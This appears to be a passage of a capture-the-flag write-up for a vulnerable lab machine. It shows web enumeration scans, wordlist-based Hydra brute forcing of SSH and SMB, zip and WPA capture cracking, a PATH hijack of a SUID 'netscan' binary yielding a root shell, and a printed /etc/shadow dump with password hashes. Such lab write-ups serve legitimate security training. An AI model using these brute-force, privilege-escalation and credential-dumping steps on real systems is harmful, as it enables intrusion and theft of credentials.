+<span id="cb19-72"><a href="#cb19-72" aria-hidden="true"></a>                <span class="kw">&lt;li&gt;&lt;a</span><span class="ot"> href=</span><span class="st">&quot;&quot;</span><span class="kw">&gt;</span>About us<span class="kw">&lt;/a&gt;&lt;/li&gt;</span></span>
+<span id="cb19-73"><a href="#cb19-73" aria-hidden="true"></a>                <span class="kw">&lt;li&gt;&lt;a</span><span class="ot"> href=</span><span class="st">&quot;&quot;</span><span class="kw">&gt;</span>Services<span class="kw">&lt;/a&gt;&lt;/li&gt;</span></span>
+<span id="cb19-74"><a href="#cb19-74" aria-hidden="true"></a>                <span class="kw">&lt;li&gt;&lt;a</span><span class="ot"> href=</span><span class="st">&quot;&quot;</span><span class="kw">&gt;</span>News<span class="kw">&lt;/a&gt;&lt;/li&gt;</span></span>
+<span id="cb19-75"><a href="#cb19-75" aria-hidden="true"></a>                <span class="kw">&lt;li&gt;&lt;a</span><span class="ot"> href=</span><span class="st">&quot;&quot;</span><span class="kw">&gt;</span>Contact<span class="kw">&lt;/a&gt;&lt;/li&gt;</span></span>
+<span id="cb19-76"><a href="#cb19-76" aria-hidden="true"></a>            <span class="kw">&lt;/ul&gt;</span></span>
+<span id="cb19-77"><a href="#cb19-77" aria-hidden="true"></a>            <span class="kw">&lt;div</span><span class="ot"> class=</span><span class="st">&quot;copyright&quot;</span><span class="kw">&gt;</span><span class="co">&lt;!-- James/Hacker --&gt;</span></span>
+<span id="cb19-78"><a href="#cb19-78" aria-hidden="true"></a>Copyright <span class="dv">&amp;copy;</span><span class="kw">&lt;script&gt;</span><span class="bu">document</span><span class="op">.</span><span class="fu">write</span>(<span class="kw">new</span> <span class="bu">Date</span>()<span class="op">.</span><span class="fu">getFullYear</span>())<span class="op">;</span><span class="kw">&lt;/script&gt;</span></span>
+<span id="cb19-79"><a href="#cb19-79" aria-hidden="true"></a>All rights reserved | This template is made with James/Hacker</span>
+<span id="cb19-80"><a href="#cb19-80" aria-hidden="true"></a><span class="kw">&lt;i</span><span class="ot"> class=</span><span class="st">&quot;fa fa-heart-o&quot;</span><span class="ot"> aria-hidden=</span><span class="st">&quot;true&quot;</span><span class="kw">&gt;&lt;/i&gt;</span> by <span class="kw">&lt;a</span><span class="ot"> href=</span><span class="st">&quot;http:jameshacker.me&quot;</span><span class="ot"> target=</span><span class="st">&quot;_blank&quot;</span><span class="kw">&gt;</span>James<span class="kw">&lt;/a&gt;</span></span>
+<span id="cb19-81"><a href="#cb19-81" aria-hidden="true"></a><span class="co">&lt;!-- James/Hacker --&gt;</span><span class="kw">&lt;/div&gt;</span></span>
+<span id="cb19-82"><a href="#cb19-82" aria-hidden="true"></a>        <span class="kw">&lt;/div&gt;</span></span>
+<span id="cb19-83"><a href="#cb19-83" aria-hidden="true"></a>    <span class="kw">&lt;/footer&gt;</span></span>
+<span id="cb19-84"><a href="#cb19-84" aria-hidden="true"></a>    <span class="co">&lt;!-- Footer top section end --&gt;</span></span>
+<span id="cb19-85"><a href="#cb19-85" aria-hidden="true"></a></span>
+<span id="cb19-86"><a href="#cb19-86" aria-hidden="true"></a>####################GET#####smb##############free</span>
+<span id="cb19-87"><a href="#cb19-87" aria-hidden="true"></a>    <span class="co">&lt;!--====== Javascripts &amp; Jquery ======--&gt;</span></span>
+<span id="cb19-88"><a href="#cb19-88" aria-hidden="true"></a>    <span class="kw">&lt;script</span><span class="ot"> src=</span><span class="st">&quot;js/jquery-3.2.1.min.js&quot;</span><span class="kw">&gt;&lt;/script&gt;</span></span>
+<span id="cb19-89"><a href="#cb19-89" aria-hidden="true"></a>    <span class="kw">&lt;script</span><span class="ot"> src=</span><span class="st">&quot;js/bootstrap.min.js&quot;</span><span class="kw">&gt;&lt;/script&gt;</span></span>
+<span id="cb19-90"><a href="#cb19-90" aria-hidden="true"></a>    <span class="kw">&lt;script</span><span class="ot"> src=</span><span class="st">&quot;js/owl.carousel.min.js&quot;</span><span class="kw">&gt;&lt;/script&gt;</span></span>
+<span id="cb19-91"><a href="#cb19-91" aria-hidden="true"></a>    <span class="kw">&lt;script</span><span class="ot"> src=</span><span class="st">&quot;js/circle-progress.min.js&quot;</span><span class="kw">&gt;&lt;/script&gt;</span></span>
+<span id="cb19-92"><a href="#cb19-92" aria-hidden="true"></a>    <span class="kw">&lt;script</span><span class="ot"> src=</span><span class="st">&quot;js/main.js&quot;</span><span class="kw">&gt;&lt;/script&gt;</span></span>
+<span id="cb19-93"><a href="#cb19-93" aria-hidden="true"></a></span>
+<span id="cb19-94"><a href="#cb19-94" aria-hidden="true"></a>    <span class="kw">&lt;/body&gt;</span></span>
+<span id="cb19-95"><a href="#cb19-95" aria-hidden="true"></a><span class="kw">&lt;/html&gt;</span></span></code></pre></div>
+<p>It basically says “GET smb free”.</p>
+<h3 id="nikto">nikto</h3>
+<pre class="shell"><code>nikto -C all -host http://$RHOST | tee nikto.txt
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.56.86
++ Target Hostname:    192.168.56.86
++ Target Port:        80
++ Start Time:         2022-01-02 08:23:19 (GMT5.5)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.18 (Ubuntu)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ Server may leak inodes via ETags, header found with file /, inode: c0e, size: 59686492a99fd, mtime: gzip
++ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
++ OSVDB-3268: /css/: Directory indexing found.
++ OSVDB-3092: /css/: This might be interesting...
++ OSVDB-3268: /html/: Directory indexing found.
++ OSVDB-3092: /html/: This might be interesting...
++ OSVDB-3268: /img/: Directory indexing found.
++ OSVDB-3092: /img/: This might be interesting...
++ OSVDB-3233: /icons/README: Apache default file found.
++ 26522 requests: 0 error(s) and 13 item(s) reported on remote host
++ End Time:           2022-01-02 08:24:05 (GMT5.5) (46 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+</code></pre>
+<h3 id="feroxbuster">feroxbuster</h3>
+<pre class="shell"><code>feroxbuster -q -u http://$RHOST -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --rate-limit 100 -d 2 -L 4 -k
+301        9l       28w      313c http://192.168.56.86/news
+301        9l       28w      312c http://192.168.56.86/img
+301        9l       28w      318c http://192.168.56.86/img/icons
+301        9l       28w      313c http://192.168.56.86/html
+301        9l       28w      316c http://192.168.56.86/gallery
+301        9l       28w      312c http://192.168.56.86/css
+301        9l       28w      311c http://192.168.56.86/js
+🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_192_168_56_86-1641092426.state ...
+Scanning: http://192.168.56.86
+Scanning: http://192.168.56.86/news
+Scanning: http://192.168.56.86/img
+Scanning: http://192.168.56.86/html
+Scanning: http://192.168.56.86/gallery
+Scanning: http://192.168.56.86/css
+Scanning: http://192.168.56.86/js
+</code></pre>
+<h3 id="browsing-found-urls">Browsing found URLs</h3>
+<figure>
+<img src="3.news.png" alt="" /><figcaption>3.news</figcaption>
+</figure>
+<figure>
+<img src="4.css.png" alt="" /><figcaption>4.css</figcaption>
+</figure>
+<figure>
+<img src="5.img.png" alt="" /><figcaption>5.img</figcaption>
+</figure>
+<figure>
+<img src="6.html.png" alt="" /><figcaption>6.html</figcaption>
+</figure>
+<figure>
+<img src="7.gallery.png" alt="" /><figcaption>7.gallery</figcaption>
+</figure>
+<figure>
+<img src="8.js.png" alt="" /><figcaption>8.js</figcaption>
+</figure>
+<p>Anything interesting here is in the gallery/ directory. But I will have to circle back to it.</p>
+<h3 id="dirb">dirb</h3>
+<pre class="shell"><code>dirb http://$RHOST
+
+-----------------
+DIRB v2.22
+By The Dark Raver
+-----------------
+
+START_TIME: Sun Jan  2 08:31:28 2022
+URL_BASE: http://192.168.56.86/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612
+
+---- Scanning URL: http://192.168.56.86/ ----
+==&gt; DIRECTORY: http://192.168.56.86/css/
+==&gt; DIRECTORY: http://192.168.56.86/gallery/
+==&gt; DIRECTORY: http://192.168.56.86/html/
+==&gt; DIRECTORY: http://192.168.56.86/img/
++ http://192.168.56.86/index.html (CODE:200|SIZE:3086)
+==&gt; DIRECTORY: http://192.168.56.86/js/
+==&gt; DIRECTORY: http://192.168.56.86/news/
++ http://192.168.56.86/server-status (CODE:403|SIZE:278)
+
+---- Entering directory: http://192.168.56.86/css/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.
+    (Use mode &#39;-w&#39; if you want to scan it anyway)
+
+---- Entering directory: http://192.168.56.86/gallery/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.
+    (Use mode &#39;-w&#39; if you want to scan it anyway)
+
+---- Entering directory: http://192.168.56.86/html/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.
+    (Use mode &#39;-w&#39; if you want to scan it anyway)
+
+---- Entering directory: http://192.168.56.86/img/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.
+    (Use mode &#39;-w&#39; if you want to scan it anyway)
+
+---- Entering directory: http://192.168.56.86/js/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.
+    (Use mode &#39;-w&#39; if you want to scan it anyway)
+
+---- Entering directory: http://192.168.56.86/news/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.
+    (Use mode &#39;-w&#39; if you want to scan it anyway)
+
+-----------------
+END_TIME: Sun Jan  2 08:31:29 2022
+DOWNLOADED: 4612 - FOUND: 2
+</code></pre>
+<h3 id="gobuster">gobuster</h3>
+<pre class="shell"><code>gobuster dir --url http://$RHOST -x js,png,py,txt,php,log,bak --wordlist=/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -b 404,403 -q
+/news                 (Status: 301) [Size: 313] [--&gt; http://192.168.56.86/news/]
+/img                  (Status: 301) [Size: 312] [--&gt; http://192.168.56.86/img/]
+/html                 (Status: 301) [Size: 313] [--&gt; http://192.168.56.86/html/]
+/gallery              (Status: 301) [Size: 316] [--&gt; http://192.168.56.86/gallery/]
+/css                  (Status: 301) [Size: 312] [--&gt; http://192.168.56.86/css/]
+/js                   (Status: 301) [Size: 311] [--&gt; http://192.168.56.86/js/]
+^C
+[!] Keyboard interrupt detected, terminating.
+</code></pre>
+<p>This is going nowhere.</p>
+<h2 id="hydra">hydra</h2>
+<p>I have users but I don’t have passwords.</p>
+<h3 id="cewl">cewl</h3>
+<pre class="shell"><code>cewl http://$RHOST/ --with-numbers -d 4 -e &gt;&gt; cewl.txt
+</code></pre>
+<pre class="shell"><code>wc cewl.txt
+ 39  45 329 cewl.txt
+</code></pre>
+<h3 id="hydra-ssh">hydra SSH</h3>
+<p>SSH is running on port 2525</p>
+<pre class="shell"><code>hydra -L users.txt -P cewl.txt $RHOST ssh -s 2525
+Hydra v9.2 (c) 2021 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-02 08:35:22
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 234 login tries (l:6/p:39), ~15 tries per task
+[DATA] attacking ssh://192.168.56.86:2525/
+1 of 1 target completed, 0 valid password found
+[WARNING] Writing restore file because 1 final worker threads did not complete until end.
+[ERROR] 1 target did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-01-02 08:35:52
+</code></pre>
+<h3 id="hydra-smb">hydra smb</h3>
+<pre class="shell"><code>hydra -L users.txt -P cewl.txt $RHOST smb
+Hydra v9.2 (c) 2021 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-02 08:36:01
+[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
+[DATA] max 1 task per 1 server, overall 1 task, 234 login tries (l:6/p:39), ~234 tries per task
+[DATA] attacking smb://192.168.56.86:445/
+[445][smb] Host: 192.168.56.86 Account: blackjax Error: Invalid account (Anonymous success)
+[445][smb] Host: 192.168.56.86 Account: nitin Error: Invalid account (Anonymous success)
+[445][smb] Host: 192.168.56.86 Account: NITIN Error: Invalid account (Anonymous success)
+[445][smb] Host: 192.168.56.86 Account: sagar Error: Invalid account (Anonymous success)
+[445][smb] Host: 192.168.56.86 Account: anonymous Error: Invalid account (Anonymous success)
+1 of 1 target completed, 0 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-01-02 08:36:03
+</code></pre>
+<h2 id="attacking-smb-1">Attacking SMB</h2>
+<p>After I couldn’t find a pair of credentials, <code>http://192.168.56.86/img/news.png</code> suggests something.</p>
+<figure>
+<img src="9.img-news.png" alt="" /><figcaption>9.img-news</figcaption>
+</figure>
+<pre class="shell"><code>smbclient //$RHOST/nitin -U nitin
+Enter WORKGROUP\nitin&#39;s password:
+tree connect failed: NT_STATUS_BAD_NETWORK_NAME
+</code></pre>
+<pre class="shell"><code>smbclient //$RHOST/blackjax -U blackjax
+Enter WORKGROUP\blackjax&#39;s password:
+tree connect failed: NT_STATUS_BAD_NETWORK_NAME
+</code></pre>
+<pre class="shell"><code>smbclient //$RHOST/smb -U smb
+Enter WORKGROUP\smb&#39;s password:
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Mon Nov  4 17:20:37 2019
+  ..                                  D        0  Mon Nov  4 17:07:28 2019
+  main.txt                            N       10  Mon Nov  4 17:15:38 2019
+  safe.zip                            N  3424907  Mon Nov  4 17:20:37 2019
+
+                9204224 blocks of size 1024. 6710812 blocks available
+smb: \&gt; get main.txt
+getting file \main.txt of size 10 as main.txt (1.1 KiloBytes/sec) (average 1.1 KiloBytes/sec)
+smb: \&gt; get safe.zip
+getting file \safe.zip of size 3424907 as safe.zip (44008.3 KiloBytes/sec) (average 39348.8 KiloBytes/sec)
+smb: \&gt; exit
+</code></pre>
+<pre class="shell"><code>ls
+main.txt  safe.zip
+</code></pre>
+<pre class="shell"><code>cat main.txt
+helo
+</code></pre>
+<h2 id="cracking-safe">Cracking safe</h2>
+<pre class="shell"><code>fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u safe.zip
+
+
+PASSWORD FOUND!!!!: pw == hacker1
+</code></pre>
+<pre class="shell"><code>unzip safe.zip -d safe
+Archive:  safe.zip
+[safe.zip] secret.jpg password:
+  inflating: safe/secret.jpg
+  inflating: safe/user.cap
+</code></pre>
+<pre class="shell"><code>cd safe
+</code></pre>
+<pre class="shell"><code>ls -la
+total 6832
+drwxr-xr-x 2 f0c1s f0c1s    4096 Jan  2 12:53 .
+drwxr-xr-x 3 f0c1s f0c1s    4096 Jan  2 12:53 ..
+-rw-r--r-- 1 f0c1s f0c1s   62471 Aug 15  2018 secret.jpg
+-rw-r--r-- 1 f0c1s f0c1s 6920971 Nov  4  2019 user.cap
+</code></pre>
+<pre class="shell"><code>exiftool secret.jpg
+ExifTool Version Number         : 12.36
+File Name                       : secret.jpg
+Directory                       : .
+File Size                       : 61 KiB
+File Modification Date/Time     : 2018:08:15 01:29:03+05:30
+File Access Date/Time           : 2019:11:04 12:51:43+05:30
+File Inode Change Date/Time     : 2022:01:02 12:53:51+05:30
+File Permissions                : -rw-r--r--
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+JFIF Version                    : 1.01
+Resolution Unit                 : None
+X Resolution                    : 1
+Y Resolution                    : 1
+Image Width                     : 1200
+Image Height                    : 675
+Encoding Process                : Progressive DCT, Huffman coding
+Bits Per Sample                 : 8
+Color Components                : 3
+Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
+Image Size                      : 1200x675
+Megapixels                      : 0.810
+</code></pre>
+<pre class="shell"><code>file user.cap
+user.cap: pcap capture file, microsecond ts (little-endian) - version 2.4 (802.11, capture length 65535)
+</code></pre>
+<pre class="shell"><code>aircrack-ng -w /usr/share/wordlists/rockyou.txt user.cap
+
+                               Aircrack-ng 1.6
+
+      [00:00:00] 1579/10303727 keys tested (5032.91 k/s)
+
+      Time left: 34 minutes, 6 seconds                           0.02%
+
+                           KEY FOUND! [ snowflake ]
+
+
+      Master Key     : 88 D4 8C 29 79 BF DF 88 B4 14 0F 5A F3 E8 FB FB
+                       59 95 91 7F ED 3E 93 DB 2A C9 BA FB EE 07 EA 62
+
+      Transient Key  : BA 24 7C 42 0F D4 90 00 5D E2 16 CF B2 C8 E5 2C
+                       B9 27 97 B0 62 A5 37 22 AE EF F2 8E 46 20 60 60
+                       38 D4 D0 12 B3 92 37 77 CB 78 B4 E3 A6 6E E2 36
+                       80 C9 97 EE 9A 7E 3F B8 45 1F 89 42 F4 0C 20 61
+
+      EAPOL HMAC     : ED B5 F7 D9 56 98 B0 5E 25 7D 86 08 C4 D4 02 3D</code></pre>
+<figure>
+<img src="10.aircrack.png" alt="" /><figcaption>10.aircrack</figcaption>
+</figure>
+<h2 id="cracking-ssh">cracking SSH</h2>
+<pre class="shell"><code>cat users.txt
+smb
+blackjax
+nitin
+NITIN
+sagar
+anonymous
+</code></pre>
+<pre class="shell"><code>cat passwords.txt
+hacker1
+snowflake
+</code></pre>
+<pre class="shell"><code>hydra -L users.txt -P passwords.txt $RHOST ssh -s 2525
+Hydra v9.2 (c) 2021 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-02 13:00:57
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 12 tasks per 1 server, overall 12 tasks, 12 login tries (l:6/p:2), ~1 try per task
+[DATA] attacking ssh://192.168.56.86:2525/
+[2525][ssh] host: 192.168.56.86   login: blackjax   password: snowflake
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 1 final worker threads did not complete until end.
+[ERROR] 1 target did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-01-02 13:00:59
+</code></pre>
+<figure>
+<img src="11.crack-ssh.png" alt="" /><figcaption>11.crack-ssh</figcaption>
+</figure>
+<p>Credentials: blackjax:snowflake</p>
+<h2 id="user-blackjax">user blackjax</h2>
+<pre class="shell"><code>ssh blackjax@$RHOST -p 2525
+The authenticity of host &#39;[192.168.56.86]:2525 ([192.168.56.86]:2525)&#39; can&#39;t be established.
+ED25519 key fingerprint is SHA256:1l05HpfviqAHWEW02NNLxk4zhf2Ne1fS5QnCd7hTGQA.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#39;[192.168.56.86]:2525&#39; (ED25519) to the list of known hosts.
+blackjax@192.168.56.86&#39;s password:
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic i686)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+151 packages can be updated.
+100 updates are security updates.
+
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+Last login: Mon Nov  4 15:37:42 2019 from 192.168.1.50
+$ id
+uid=1001(blackjax) gid=1001(blackjax) groups=1001(blackjax)
+$ whoami
+blackjax
+$ cat /etc/passwd | grep home
+syslog:x:104:108::/home/syslog:/bin/false
+sagar:x:1000:1000:sagar,,,:/home/sagar:/bin/bash
+blackjax:x:1001:1001::/home/blackjax:/bin/sh
+smb:x:1002:1002::/home/smb/smb:/usr/sbin/nolgin
+</code></pre>
+<pre class="shell"><code>$ sudo -l
+[sudo] password for blackjax:
+Sorry, user blackjax may not run sudo on nitin.168.1.7.</code></pre>
+<pre class="shell"><code>bash -i
+
+blackjax@nitin:~$ pwd
+/home/blackjax
+blackjax@nitin:~$ ls -la
+total 12
+drwxr-xr-x 2 root root 4096 Nov  4  2019 .
+drwxr-xr-x 5 root root 4096 Nov  4  2019 ..
+-rw-r--r-- 1 root root  586 Nov  4  2019 user.txt
+blackjax@nitin:~$ cat user.txt
+  _    _  _____ ______ _____        ______ _               _____
+ | |  | |/ ____|  ____|  __ \      |  ____| |        /\   / ____|
+ | |  | | (___ | |__  | |__) |_____| |__  | |       /  \ | |  __
+ | |  | |\___ \|  __| |  _  /______|  __| | |      / /\ \| | |_ |
+ | |__| |____) | |____| | \ \      | |    | |____ / ____ \ |__| |
+  \____/|_____/|______|_|  \_\     |_|    |______/_/    \_\_____|
+
+
+
+Go To Root.
+
+MD5-HASH : f589a6959f3e04037eb2b3eb0ff726ac
+blackjax@nitin:~$
+
+## SUID binaries
+blackjax@nitin:~$ find / -perm -4000 2&gt;/dev/null
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/snapd/snap-confine
+/usr/lib/i386-linux-gnu/lxc/lxc-user-nic
+/usr/lib/eject/dmcrypt-get-device
+/usr/bin/newgidmap
+/usr/bin/gpasswd
+/usr/bin/newuidmap
+/usr/bin/chfn
+/usr/bin/passwd
+/usr/bin/chsh
+/usr/bin/at
+/usr/bin/pkexec
+/usr/bin/newgrp
+/usr/bin/netscan
+/usr/bin/sudo
+/bin/ping6
+/bin/fusermount
+/bin/mount
+/bin/su
+/bin/ping
+/bin/umount
+/bin/ntfs-3g</code></pre>
+<h3 id="usrbinnetscan-sticks-out">/usr/bin/netscan sticks out</h3>
+<pre class="shell"><code>blackjax@nitin:/var/www/html$ /usr/bin/netscan
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 0.0.0.0:2525            0.0.0.0:*               LISTEN      997/sshd
+tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      870/smbd
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      995/mysqld
+tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      870/smbd
+tcp        0    188 192.168.56.86:2525      192.168.56.70:41146     ESTABLISHED 5066/sshd: blackjax
+tcp6       0      0 :::2525                 :::*                    LISTEN      997/sshd
+tcp6       0      0 :::445                  :::*                    LISTEN      870/smbd
+tcp6       0      0 :::139                  :::*                    LISTEN      870/smbd
+tcp6       0      0 :::80                   :::*                    LISTEN      1144/apache2</code></pre>
+<p>This looks like netstat or ss.</p>
+<pre class="shell"><code>blackjax@nitin:/var/www/html$ strings /usr/bin/netscan
+/lib/ld-linux.so.2
+libc.so.6
+_IO_stdin_used
+setuid
+system
+setgid
+__libc_start_main
+__gmon_start__
+GLIBC_2.0
+PTRh
+QVhk
+UWVS
+t$,U
+[^_]
+netstat -antp
+;*2$&quot;(
+GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.11) 5.4.0 20160609
+crtstuff.c
+__JCR_LIST__
+deregister_tm_clones
+__do_global_dtors_aux
+completed.7209
+__do_global_dtors_aux_fini_array_entry
+frame_dummy
+__frame_dummy_init_array_entry
+pingshell.c
+__FRAME_END__
+__JCR_END__
+__init_array_end
+_DYNAMIC
+__init_array_start
+__GNU_EH_FRAME_HDR
+_GLOBAL_OFFSET_TABLE_
+__libc_csu_fini
+_ITM_deregisterTMCloneTable
+__x86.get_pc_thunk.bx
+_edata
+__data_start
+setgid@@GLIBC_2.0
+system@@GLIBC_2.0
+__gmon_start__
+__dso_handle
+_IO_stdin_used
+__libc_start_main@@GLIBC_2.0
+__libc_csu_init
+_fp_hw
+__bss_start
+main
+setuid@@GLIBC_2.0
+_Jv_RegisterClasses
+__TMC_END__
+_ITM_registerTMCloneTable
+.symtab
+.strtab
+.shstrtab
+.interp
+.note.ABI-tag
+.note.gnu.build-id
+.gnu.hash
+.dynsym
+.dynstr
+.gnu.version
+.gnu.version_r
+.rel.dyn
+.rel.plt
+.init
+.plt.got
+.text
+.fini
+.rodata
+.eh_frame_hdr
+.eh_frame
+.init_array
+.fini_array
+.jcr
+.dynamic
+.got.plt
+.data
+.bss
+.comment
+</code></pre>
+<p>Too long didn’t read.</p>
+<pre class="shell"><code>blackjax@nitin:/var/www/html$ strings /usr/bin/netscan | grep &quot;netstat\|ss&quot;
+netstat -antp
+__bss_start
+_Jv_RegisterClasses
+.bss
+</code></pre>
+<p>This looks like the “netstat -antp” is being used. It also seems that it can be abused.</p>
+<h3 id="confirm-nestat--antp">confirm <code>nestat -antp</code></h3>
+<pre class="shell"><code>blackjax@nitin:/var/www/html$ netstat -antp
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 0.0.0.0:2525            0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -
+tcp        0      0 192.168.56.86:2525      192.168.56.70:41146     ESTABLISHED -
+tcp6       0      0 :::2525                 :::*                    LISTEN      -
+tcp6       0      0 :::445                  :::*                    LISTEN      -
+tcp6       0      0 :::139                  :::*                    LISTEN      -
+tcp6       0      0 :::80                   :::*                    LISTEN      -
+
+blackjax@nitin:/var/www/html$ ls -la /usr/bin/netscan
+-rwsr-xr-x 1 root root 7432 Nov  4  2019 /usr/bin/netscan
+</code></pre>
+<p>The string “(Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.)” is due to netstat not being run as sudo, where as netscan is SUID binary.</p>
+<h3 id="abusing-path">Abusing path</h3>
+<pre class="shell"><code>blackjax@nitin:/var/www/html$ echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+
+blackjax@nitin:/var/www/html$ echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+blackjax@nitin:/var/www/html$ cd
+blackjax@nitin:~$ pwd
+/home/blackjax
+blackjax@nitin:~$ export PATH=/home/blackjax:$PATH
+blackjax@nitin:~$ vim netstat
+blackjax@nitin:~$ ls -la
+total 12
+drwxr-xr-x 2 root root 4096 Nov  4  2019 .
+drwxr-xr-x 5 root root 4096 Nov  4  2019 ..
+-rw-r--r-- 1 root root  586 Nov  4  2019 user.txt
+blackjax@nitin:~$ cd /tmp
+blackjax@nitin:/tmp$ export PATH=/tmp:$PATH
+blackjax@nitin:/tmp$ echo &quot;/bin/bash -pli&quot; &gt;&gt; netstat
+blackjax@nitin:/tmp$ chmod +x netstat
+blackjax@nitin:/tmp$ /usr/bin/netscan
+root@nitin:/tmp# whoami
+root
+root@nitin:/tmp# id
+uid=0(root) gid=0(root) groups=0(root),1001(blackjax)
+root@nitin:/tmp# hostname
+nitin
+root@nitin:/tmp# date
+Sun Jan  2 13:16:07 IST 2022</code></pre>
+<h2 id="post-root">Post Root</h2>
+<h3 id="etcshadow">/etc/shadow</h3>
+<pre class="shell"><code>root@nitin:/tmp# cat /etc/shadow
+root:$6$qYRmXXqd$XU/PPdAYvk0OeoqwkESgbXHF1B2Yql7BjyoKsruFdku0/sP4AUvxWjq03j9rbublYMXouYHhtGo346nVD3H8F/:18204:0:99999:7:::
+daemon:*:17953:0:99999:7:::
+bin:*:17953:0:99999:7:::
+sys:*:17953:0:99999:7:::
+sync:*:17953:0:99999:7:::
+games:*:17953:0:99999:7:::
+man:*:17953:0:99999:7:::
+lp:*:17953:0:99999:7:::
+mail:*:17953:0:99999:7:::
+news:*:17953:0:99999:7:::
+uucp:*:17953:0:99999:7:::
+proxy:*:17953:0:99999:7:::
+www-data:*:17953:0:99999:7:::
+backup:*:17953:0:99999:7:::
+list:*:17953:0:99999:7:::
+irc:*:17953:0:99999:7:::
+gnats:*:17953:0:99999:7:::
+nobody:*:17953:0:99999:7:::
+systemd-timesync:*:17953:0:99999:7:::
+systemd-network:*:17953:0:99999:7:::
+systemd-resolve:*:17953:0:99999:7:::
+systemd-bus-proxy:*:17953:0:99999:7:::
+syslog:*:17953:0:99999:7:::
+_apt:*:17953:0:99999:7:::
+lxd:*:18204:0:99999:7:::
+messagebus:*:18204:0:99999:7:::
+uuidd:*:18204:0:99999:7:::
+dnsmasq:*:18204:0:99999:7:::
+sshd:*:18204:0:99999:7:::
+sagar:$6$E/v8EEVB$JmnHael6bS8/71zLgBlq5xypekWLjlq1utZ7Xjgq8FxzAeLBBt/y99P5Lvwl9VDEGKNBaQSt5jvJDjoYywKrm0:18204:0:99999:7:::
+mysql:!:18204:0:99999:7:::
